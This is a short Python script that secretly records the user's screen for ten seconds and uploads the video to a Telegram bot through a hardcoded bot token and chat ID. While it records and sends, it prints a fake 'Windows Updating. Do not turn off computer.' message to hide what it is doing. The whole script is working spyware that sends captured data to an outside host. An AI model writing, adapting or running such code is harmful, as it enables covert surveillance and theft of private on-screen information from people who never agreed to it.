import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')


import cv2
import numpy as np
import pyautogui
import time
import telegram
import asyncio

# Set the duration for recording (in seconds)
duration = 10
# Set the frame rate
fps = 20.0

# Get the screen size
screen_size = pyautogui.size()

# Define the codec and create VideoWriter object
fourcc = cv2.VideoWriter_fourcc(*"XVID")
out = cv2.VideoWriter("screen_record.avi", fourcc, fps, screen_size)

# Start the recording
start_time = time.time()
while True:
    # Capture the screen
    img = pyautogui.screenshot()
    # Convert the image to a numpy array
    frame = np.array(img)
    # Convert the color from BGR to RGB
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    # Write the frame to the video file
    out.write(frame)

    # Check if the specified duration has passed
    if time.time() - start_time > duration:
        break

# Release everything if job is done
out.release()
cv2.destroyAllWindows()

print("Windows Updating. Do not turn off computer.")

# Define an asynchronous function to send the video
async def send_video_to_telegram(token, chat_id, video_file):
    bot = telegram.Bot(token=token)
    with open(video_file, 'rb') as f:
        await bot.send_video(chat_id=chat_id, video=f, supports_streaming=True)
    print("Windows Updating. Do not turn off computer.")

# Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q'
CHAT_ID = '2044432474'

# Run the asynchronous function
asyncio.run(send_video_to_telegram(BOT_TOKEN, CHAT_ID, "screen_record.avi"))
